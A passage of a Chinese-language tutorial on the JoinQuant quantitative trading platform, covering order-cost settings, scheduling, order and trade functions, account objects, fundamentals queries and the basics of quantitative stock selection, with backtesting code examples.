<li>佣金&#x2F;印花税：set_order_cost(cost,type,ref&#x3D;None)</li>
<li>滑点：真是成交价格与下单时预期的价格偏差，set_slippage(object,type&#x3D;None,ref&#x3D;None)</li>
<li>成交量比例：根据实际行情限制每个订单的成交量，set_option(‘order_volume_ratio’,value)</li>
<li>动态复权模式：设置真实价格，建议开启，set_option(‘use_real_option’,value)</li>
</ul>
<p>这几个函数的使用</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;10:30&#x27;</span>)  <span class="comment"># 每次Bar执行</span></span><br><span class="line">    <span class="comment">#设置佣金，税率</span></span><br><span class="line">    set_order_cost(OrderCost(open_commission=<span class="number">0.03</span>,close_commission=<span class="number">0.03</span>,close_tax=<span class="number">0.001</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    set_slippage(PriceRelatedSlippage(<span class="number">0.002</span>),<span class="built_in">type</span>=<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">    <span class="comment">#成交量不足50%</span></span><br><span class="line">    set_option(<span class="string">&#x27;order_volume_ratio&#x27;</span>,<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#复权</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>,<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    close_data = attribute_history(security, <span class="number">5</span>, <span class="string">&#x27;1d&#x27;</span>, [<span class="string">&#x27;close&#x27;</span>])  <span class="comment"># 获取5日收盘价</span></span><br><span class="line">    MA5 = close_data[<span class="string">&#x27;close&#x27;</span>].mean()  <span class="comment"># 5日均线</span></span><br><span class="line">    current_price = close_data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">1</span>]  <span class="comment"># 当前价格</span></span><br><span class="line">    </span><br><span class="line">    cash = context.portfolio.available_cash  <span class="comment"># 修正拼写</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 买入逻辑：价格突破均线1%</span></span><br><span class="line">    <span class="keyword">if</span> current_price &gt; <span class="number">1.01</span> * MA5:</span><br><span class="line">        order_value(security, cash)  <span class="comment"># 全仓买入</span></span><br><span class="line">        log.info(<span class="string">&quot;买入 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 卖出逻辑：价格低于均线且持有可卖数量</span></span><br><span class="line">    <span class="keyword">elif</span> current_price &lt; MA5 <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security, <span class="number">0</span>)  <span class="comment"># 清仓卖出</span></span><br><span class="line">        log.info(<span class="string">&quot;卖出 %s&quot;</span> % security)</span><br><span class="line">        </span><br><span class="line">    record(stock_price=current_price)  <span class="comment"># 记录股价</span></span><br></pre></td></tr></table></figure>

<h2 id="定时函数"><a href="#定时函数" class="headerlink" title="定时函数"></a>定时函数</h2><p>作用：设定<strong>回测</strong>和<strong>模拟交易</strong>中运行时间及频率</p>
<ul>
<li>月度：run_monthly(func,monthday,time&#x3D;’open’,reference_security)</li>
<li>周度：run_weekly(func,weekday,time&#x3D;’open’,reference_security)</li>
<li>日度：run_daily(func,time&#x3D;’open’,reference_security)</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>介绍</th>
</tr>
</thead>
<tbody><tr>
<td>func</td>
<td>用户自定义接受 <code>context</code> 参数的函数，必须是全局函数</td>
</tr>
<tr>
<td>monthday</td>
<td>指定每月的第几个交易日执行函数。当值为负数时，表示在月末第几个交易日执行函数</td>
</tr>
<tr>
<td>time</td>
<td>字符串格式，支持 <code>time</code> 表达式，例如：‘9:30’</td>
</tr>
<tr>
<td>reference_security</td>
<td>表示时间的参照指标。如按照 “000001.XSHE” 交易时间</td>
</tr>
</tbody></table>
<h2 id="交易函数"><a href="#交易函数" class="headerlink" title="交易函数"></a>交易函数</h2><p>交易函数：<code>order(security,amount,style=None,side=&#39;long&#39;,pindex=0)</code></p>
<ul>
<li>security：股票代码</li>
<li>amount：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>股票价值：<code>order_value(security,value,style=None,side=&#39;long&#39;,pindex=0)</code></p>
<ul>
<li>security：股票代码</li>
<li>value：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>目标数量：<code>order(security,amount,style=None,side=&#39;long&#39;,pindex=0,close_today=False)</code></p>
<ul>
<li>security：股票代码</li>
<li>amount：交易数量（负数表示卖出）</li>
<li>styple：下单类型</li>
<li>side：short空（一般不允许）&#x2F; long多</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>成交订单：<code>get_orders(order_id=None,security=None,status=None)</code></p>
<ul>
<li>get_orders(order_id&#x3D;’123’) 订单id查询订单号为’123’的订单</li>
<li>get_orders(security&#x3D;’000001.XSHE’) 查询所有标的为000001.XSHE的订单</li>
</ul>
<p>未完成订单：<code>get_open_orders()</code></p>
<p>在每天交易结束后获取当天所有未完成订单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        log.info(_order.order_id)</span><br></pre></td></tr></table></figure>

<p>撤单函数：<code>cancel_order(order)</code></p>
<p>在每天交易结束后对当天所有未完成订单撤单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        cancel_order(_order)</span><br></pre></td></tr></table></figure>

<p>账户出入金（充钱）：<code>inout_cash(cash,pindex=0)</code></p>
<ul>
<li>cash：浮点数，负数表示出金</li>
<li>pindex：仓位号，默认为0</li>
</ul>
<p>向账户增加10000元，inout_cash(10000,pindex&#x3D;0)</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *  <span class="comment"># 必需导入聚宽库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open, time=<span class="string">&#x27;9:30&#x27;</span>)</span><br><span class="line">    run_daily(after_market_close, time=<span class="string">&#x27;15:30&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#先向账户里面增加10000</span></span><br><span class="line">    inout_cash(<span class="number">10000</span>, pindex=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#查询可用资金</span></span><br><span class="line">    log.info(<span class="string">&quot;&quot;&quot;资金：&#123;&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(context.portfolio.subportfolios[<span class="number">0</span>].available_cash))</span><br><span class="line">    <span class="comment">#获取账户当前现金</span></span><br><span class="line">    cash = context.portfolio.available_cash</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#如果没有仓位</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        <span class="comment">#买入</span></span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出</span></span><br><span class="line">        order(g.security,-<span class="number">500</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#获取当天所有未完成订单</span></span><br><span class="line">    orders = get_open_orders()</span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        log.info(<span class="string">f&quot;&quot;&quot;未完成订单:<span class="subst">&#123;_order&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#对未完成订单进行撤单</span></span><br><span class="line">    <span class="keyword">for</span> _order <span class="keyword">in</span> orders:</span><br><span class="line">        cancel_order(_order)</span><br><span class="line">        log.info(<span class="string">f&quot;&quot;&quot;撤单:<span class="subst">&#123;_order&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="交易对象"><a href="#交易对象" class="headerlink" title="交易对象"></a>交易对象</h2><p>**order对象：**订单处理流程</p>
<p>订单创建–&gt;订单检查–&gt;报单–&gt;确认委托–&gt;撮合</p>
<ul>
<li>cummission：交易费用</li>
<li>is_buy：bool值，买还是卖</li>
<li>status：状态，一个OrderStatus值</li>
<li>price：平均成交价的</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_weekly(market_open,<span class="number">1</span>,time=<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        orders = order(g.security,<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(orders)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> orders <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建订单失败...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;交易费用：<span class="subst">&#123;orders.commission&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;是否买单：<span class="subst">&#123;orders.is_buy&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;订单状态：<span class="subst">&#123;orders.status&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;订单平均成交价：<span class="subst">&#123;orders.price&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br></pre></td></tr></table></figure>

<p>**trade对象：**订单成交相关信息</p>
<ul>
<li>time：交易时间,[datetime.datetime]对象</li>
<li>security：标的代码</li>
<li>amount：交易数量</li>
<li>price：交易价格</li>
<li>trade_id：交易记录id</li>
<li>order_id：对应的订单id</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line">    run_daily(market_open,time=<span class="string">&#x27;9:30&#x27;</span>)</span><br><span class="line">    run_daily(after_market_close, time=<span class="string">&#x27;15:30&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market_open</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        orders = order(g.security,<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出800股</span></span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">                </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_market_close</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;闭市后&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#得到所有的成交记录</span></span><br><span class="line">    trades = get_trades()</span><br><span class="line">    <span class="keyword">for</span> _trade <span class="keyword">in</span> trades.values():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;成交记录：<span class="subst">&#123;_trade&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;成交时间：<span class="subst">&#123;_trade.time&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;对应的订单id：<span class="subst">&#123;_trade.order_id&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="策略信息"><a href="#策略信息" class="headerlink" title="策略信息"></a>策略信息</h2><p>**Context对象:**策略信息总览，包含账户、时间等信息</p>
<ul>
<li><strong>subportfolios</strong>: 当前单个操作仓位的资金、标的信息，是一个 <code>SubPortfolio</code> 的数组。</li>
<li><strong>portfolio</strong>: 账户信息，即 <code>subportfolios</code> 的汇总信息，<code>Portfolio</code> 对象，单个操作仓位时，<code>portfolio</code> 指向 <code>subportfolios[0]</code>。</li>
<li><strong>current_dt</strong>: 当前单位时间的开始时间，[datetime.datetime] 对象。</li>
<li><strong>previous_date</strong>: 前一个交易日，[datetime.date] 对象，注意这是一个日期，是 <code>date</code>，而不是 <code>datetime</code>。</li>
<li><strong>universe</strong>: 查询 <code>set_universe()</code> 设置的股票池，比如： <code>[&#39;000001.XSHE&#39;, &#39;600000.XSHG&#39;]</code>。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#context.portflio变为整数1</span></span><br><span class="line">    context.portfolio = <span class="number">1</span></span><br><span class="line">    log.info(context.portfolio)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#回复系统变量</span></span><br><span class="line">    <span class="keyword">del</span> context.portfolio</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#context.portfolio将变为用户账户信息</span></span><br><span class="line">    log.info(context.portfolio.total_value)</span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#输出账户总资产</span></span><br><span class="line">    log.info(context.portfolio.total_value)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出持仓金额</span></span><br><span class="line">    log.info(context.portfolio.positions_value)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出今日日期</span></span><br><span class="line">    log.info(context.current_dt.day)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输出总权益的累计收益</span></span><br><span class="line">    log.info(context.portfolio.returns)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取仓位subportfolios[0]的可用资金</span></span><br><span class="line">    log.info(context.subportfolios[<span class="number">0</span>].available_cash)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>**Position对象：**输出持有的标的信息</p>
<ul>
<li><strong>security</strong>: 标的的代码。</li>
<li><strong>price</strong>: 最新行情价格。</li>
<li><strong>total_amount</strong>: 总合计，不包括挂单冻结仓位。</li>
<li><strong>init_time</strong>: 建仓时间，格式为 <code>datetime.datetime</code>。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        <span class="comment">#下单1000股</span></span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#卖出800股</span></span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(context.portfolio.long_positions))</span><br><span class="line">    long_positions_dict = context.portfolio.long_positions</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">list</span>(long_positions_dict.values()):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;标：<span class="subst">&#123;position.security&#125;</span>，总仓位：<span class="subst">&#123;position.total_amount&#125;</span></span></span><br><span class="line"><span class="string">        ，标的价值：<span class="subst">&#123;position.value&#125;</span>，建仓时间：<span class="subst">&#123;position.init_time&#125;</span>&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="账户信息"><a href="#账户信息" class="headerlink" title="账户信息"></a>账户信息</h2><p>**portfolio对象：**总帐户信息</p>
<ul>
<li><strong>long_positions</strong>: 多单的仓位，一个字典，key 是证券代码，value 是 [Position] 对象。</li>
<li><strong>short_positions</strong>: 空单的仓位，一个字典，key 是证券代码，value 是 [Position] 对象。</li>
<li><strong>total_value</strong>: 总的权益，包括现金、保证金（期货）或者仓位（股票）的总价值，可用于计算收益。</li>
<li><strong>returns</strong>: 总权益的累计收益；（当前总资产 + 今日出入金 - 昨日总资产）&#x2F; 昨日总资产。</li>
<li><strong>starting_cash</strong>: 初始资金，现在等于 <code>inout_cash</code>。</li>
<li><strong>positions_value</strong>: 持仓价值。</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;多单的仓位：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.long_positions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;空单的仓位：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.short_positions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;总权益：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.total_value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;总权益的累计收益：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.returns))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;初始资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.starting_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;持仓价值：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.portfolio.positions_value))</span><br></pre></td></tr></table></figure>

<p>**subportfolio对象：**子账户信息</p>
<ul>
<li><strong>inout_cash</strong>: 累计出入金，如初始资金 1000，后面转移出去 100，则这个值是 1000 - 100。</li>
<li><strong>available_cash</strong>: 可用资金，可以用来购买证券的资金。</li>
<li><strong>transferable_cash</strong>: 可取资金，即可以提取的资金，不包括今日卖出证券所得资金。</li>
<li><strong>locked_cash</strong>: 挂单锁住资金。</li>
<li><strong>type</strong>: 账号所属类型。</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定业绩比较基准</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    g.security = <span class="string">&quot;000001.XSHE&quot;</span>  <span class="comment"># 深交所平安银行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    <span class="comment">#如果没有持仓</span></span><br><span class="line">    <span class="keyword">if</span> g.security <span class="keyword">not</span> <span class="keyword">in</span> context.portfolio.positions:</span><br><span class="line">        order(g.security,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        order(g.security,-<span class="number">800</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;累计出入金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].inout_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;可用资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].available_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;可取资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].transferable_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;挂单锁住资金：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].locked_cash))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;账户所属类型：&#123;&#125;&quot;&quot;&quot;</span>,<span class="built_in">format</span>(context.subportfolios[<span class="number">0</span>].<span class="built_in">type</span>))</span><br></pre></td></tr></table></figure>

<h1 id="量化交易数据获取"><a href="#量化交易数据获取" class="headerlink" title="量化交易数据获取"></a>量化交易数据获取</h1><p>个股K线数据可以直接通过同花顺，聚宽等直接下载</p>
<h2 id="财务数据"><a href="#财务数据" class="headerlink" title="财务数据"></a>财务数据</h2><p>**get_fundamentals(query_object,date&#x3D;None,statDate&#x3D;None)：**查询财务数据</p>
<ul>
<li><strong>注意</strong>: <code>date</code> 和 <code>statDate</code> 参数只能传入一个。</li>
<li>传入 <code>date</code> 时，查询指定日期后能看到的最近（除市值表外为最近一个季度，市值为最近一天）的数据。</li>
<li>传入 <code>statDate</code> 时，查询 <code>statDate</code> 指定的季度或年份的财务数据。</li>
<li><strong>date&#x2F;statdate</strong>: 获取一个字符串（格式类似 ‘2015-10-15’）或 <code>datetime</code> 对象。</li>
<li><strong>query_object</strong>: 一个 <code>sqlalchemy.orm.query.Query</code> 对象，可以通过全局的 <code>query</code> 函数获取。</li>
</ul>
<p><strong>query_object()：<strong>查询数据API，可以是</strong>整张表，也可以是标准的多个字段或计算结果</strong></p>
<ul>
<li><strong>filter</strong>: 填写过滤条件，可以使用逗号分隔多个条件，或使用 <code>and</code>、<code>or</code>。</li>
<li><strong>order_by</strong>: 填写排序条件。</li>
<li><strong>limit</strong>: 限制返回的个数。</li>
<li><strong>group_by</strong>: 进行分组统计。</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">query(valuation).<span class="built_in">filter</span>(valuation.code == <span class="string">&#x27;000001.XSHE&#x27;</span>)  <span class="comment"># 查询 &#x27;000001.XSHE&#x27; 的全部市值数据</span></span><br></pre></td></tr></table></figure>

<p>**get_fundamentals_continuously(query_object,end_date&#x3D;None,count&#x3D;None,panel&#x3D;True)：**查询多日的财务数据</p>
<ul>
<li><strong>end_date</strong>: 获取一个字符串（格式类似于 ‘2015-10-15’）或 datetime 对象。</li>
<li><strong>count</strong>: 获取 <code>end_date</code> 前的 <code>count</code> 个日期的数据，<code>count</code> 应小于 500。</li>
<li><strong>panel</strong>: 默认 <code>panel=True</code>，返回一个 <code>pandas.Panel</code>；建议设置 <code>panel=False</code>，返回更有效的 DataFrame。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询平安银行2022年9月1日</span></span><br><span class="line">q = query(</span><br><span class="line">    valuation</span><br><span class="line">    ).<span class="built_in">filter</span>(</span><br><span class="line">        valuation.code == <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">df = get_fundamentals(q,<span class="string">&#x27;2022-09-01&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;market_cap&#x27;</span>][<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="量化选股-1"><a href="#量化选股-1" class="headerlink" title="量化选股"></a>量化选股</h1><h2 id="量化选股概况"><a href="#量化选股概况" class="headerlink" title="量化选股概况"></a>量化选股概况</h2><ol>
<li><strong>量化选股</strong>: 利用<strong>数量化的方法选择股票组合</strong>，期望该组合能够获得超越基准的投资行为。</li>
<li><strong>技术面选股</strong>: 利用<strong>各种技术理论或技术指标</strong>来分析和预测股票的未来价格走势。</li>
<li><strong>基本面选股</strong>: 通过对上市公司在发展过程中面临的<strong>外部因素</strong>和<strong>自身因素</strong>进行分析，判断该公司的股票是否值得购买。</li>
</ol>
<blockquote>
<p>量化选股注意事项</p>
<ul>
<li>分配多股，减少单股重仓的情况</li>
<li>全面研究个股基本面，增强个股判断逻辑和支撑</li>
<li>主动投资而非被动投资</li>
<li>只是提高胜率的工具之一</li>
</ul>
</blockquote>
<hr>
<blockquote>
<p>白马股选股</p>
<p>一、筛选条件：</p>
<ol>
<li>总市值&gt;50亿（市值较大的公司，流动性好，竞争力强）</li>
<li>上市天数&gt;750（抛开3年以内的次新）</li>
<li>流通盘比例&gt;95%（要全流通，避免解禁压力）</li>
<li>销售毛利率&gt;20%（毛利率要高）</li>
<li>扣非净资产收益率&gt;20%（ROE要高）</li>
</ol>
<p>二、排名条件：</p>
<ol>
